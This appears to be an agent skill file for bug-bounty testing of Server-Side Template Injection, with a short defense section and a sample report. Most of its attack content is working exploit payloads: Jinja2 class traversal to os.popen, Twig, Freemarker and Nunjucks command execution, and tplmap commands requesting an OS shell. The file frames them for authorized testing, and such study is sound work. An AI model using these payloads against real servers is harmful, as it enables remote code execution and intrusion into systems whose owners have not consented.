---
name: server-side-template-injection
description: >
  Identify and exploit Server-Side Template Injection (SSTI) vulnerabilities within web applications.
  Use this skill when testing web applications that render dynamic content using template engines
  like Jinja2 (Python), Twig (PHP), Freemarker (Java), or Pug (Node.js). Covers identification via
  mathematical evaluation, context mapping, escaping sandboxes, and achieving Remote Code Execution (RCE).
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: advanced
estimated_time: "3-6 hours"
mitre_attack:
  tactics: [TA0001, TA0002]
  techniques: [T1190, T1059]
platforms: [linux, windows, macos]
tags: [ssti, template-injection, web-vulnerabilities, rce, jinja2, twig, freemarker, bug-bounty]
tools: [burpsuite, tplmap, python]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Server-Side Template Injection (SSTI)

## When to Use
- When discovering input fields (e.g., Usernames, Email Templates, URL parameters) that are directly rendered or reflected on the corresponding web page without sanitization.
- When XSS (Cross-Site Scripting) payloads are blocked or escaped, but the server appears to be interpreting special bracket characters (`{{ }}`, `${ }`, `<% %>`).
- When attempting to escalate a simple input reflection bug into full Remote Code Execution (RCE) on the server.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Detection and Identification

```text
# Concept: If an application unsafely passes user input into a template rendering engine, 
# it will evaluate mathematical expressions wrapped in template syntax.

# 1. Probe the application with standard template tags
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}

# 2. Analyze the response
# If the application reflects verbatim: "{{7*7}}" -> Not vulnerable, or wrong tag.
# If the application reflects: "49" -> CRITICAL! SSTI exists. The server evaluated the math.
# If the application throws an Error: The stack trace often reveals the exact engine (e.g., "Jinja2 Exception", "Twig Error").
```

### Phase 2: Engine Mapping

```text
# Once mathematical evaluation is proven, you must determine WHICH template engine is running,
# as specific payloads vary drastically between Python, Java, Ruby, and PHP engines.

# PortSwigger SSTI Decision Tree:
# Input: {{7*'7'}}
# - If output is 49     -> Looks like Twig (PHP)
# - If output is 7777777 -> Looks like Jinja2 (Python) or Nunjucks (Node)
# - If output is error   -> Try Java/Ruby syntaxes.

# Input: ${7/0}
# Java engines (Freemarker, Velocity) will throw specific arithmetic exceptions.
```

### Phase 3: Context Escaping and Sandbox Evasion

```text
# Most template engines run in a "sandbox" preventing direct access to the underlying OS.
# The goal is to traverse the object map to find classes that allow system execution (e.g., `os.popen`).

# --- EXPLOITING JINJA2 (PYTHON / FLASK) --- #

# 1. Base Class Traversal
# Get the object class, traverse up to the base object (`object`), then find all subclasses loaded in memory.
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Output will be a massive array of hundreds of Python classes. 
# Search the output for classes capable of executing commands, such as `subprocess.Popen`, `os._wrap_close`, or `importlib`.

# 2. Extracting the Index (e.g., we find `<class 'os._wrap_close'>` at index 117)
{{ ''.__class__.__mro__[1].__subclasses__()[117] }}

# 3. Payload Construction (Achieving RCE)
# Pass the shell command to the mapped execution class.
{{ ''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('id').read() }}
# Output: uid=1000(www-data) gid=1000(www-data)
```

### Phase 4: Exploiting Other Common Engines

```text
# --- EXPLOITING TWIG (PHP) --- #
# Exploit the `registerUndefinedFilterCallback` to execute arbitrary PHP functions.
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{app.request.server.all|keys|join(',')}}

# --- EXPLOITING FREEMARKER (JAVA) --- #
# Expose the `freemarker.template.utility.Execute` class.
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# --- EXPLOITING NUNJUCKS (NODE.JS) --- #
# Climb the prototype chain to reach native Node.js processes.
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### Phase 5: Automated Testing via Tplmap

```bash
# Tplmap conceptually mimics SQLmap but is designed for template injection.

# 1. Clone Tplmap
git clone https://github.com/epinna/tplmap.git

# 2. Scan a specific parameter
python2 tplmap.py -u "http://target.com/page?name=inject_here"

# 3. Request a Reverse Shell (if the engine is vulnerable and supports RCE)
python2 tplmap.py -u "http://target.com/page?name=inject_here" --os-shell
```


## 🔵 Blue Team Detection & Defense
- **Logicless Templates**: The most secure defense is migrating to "logicless" template engines (like Mustache/Handlebars without helper functions) that explicitly cannot execute code, even if unsanitized user input is evaluated.
- **Strict Separation**: NEVER construct template files dynamically using string concatenation containing user input. User input should always be passed as data parameters *contextualized* within a static, predefined template.
  - VULNERABLE: `template = Template("Hello " + user_input)`
  - SECURE: `template = Template("Hello {{ name }}"); template.render(name=user_input)`
- **Sandboxing**: Modern template environments should possess strict security configurations locking down their ability to read the file system or spawn child processes.
- **WAF Rules**: Alert on multiple bracket sequences `{{`, `${`, `<%` combined with common reflection keywords (`__class__`, `subclasses`, `require`, `exec`).

## Key Concepts
| Concept | Description |
|---------|-------------|
| SSTI | Occurs when user input is incorrectly embedded directly into a template, allowing logic execution |
| Template Engine | Software designed to combine a base HTML/Data template with a specific data model (Jinja2, Twig) |
| MRO | Method Resolution Order; In Python, a tuple of classes indicating the order Python looks up methods. Used in SSTI to walk up the execution chain |
| RCE | Remote Code Execution; the ultimate goal allowing the attacker to run arbitrary OS commands |

## Output Format
```
SSTI Vulnerability Report
=========================
Endpoint: POST /api/v1/generate_report
Parameter: `custom_title`
Template Engine: Jinja2 (Python)

Summary:
The `custom_title` parameter on the report generation screen is vulnerable to Server-Side Template Injection. The underlying Flask web framework dynamically constructs the Jinja2 template strings with raw user input.

Evidence:
Submission of the payload `{{7*7}}` results in the PDF output header rendering as "49".
Submission of the payload:
`{{ ''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('whoami').read() }}`

Resulting execution output rendered on page:
`svc_reporting_app`

Impact: HIGH/CRITICAL. This allows unauthenticated Remote Code Execution (RCE) and full shell access to the web server container.
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [Server-side template injection](https://portswigger.net/web-security/ssti)
- HackTricks: [SSTI Payloads & Syntax](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- Tplmap: [GitHub Repository](https://github.com/epinna/tplmap)
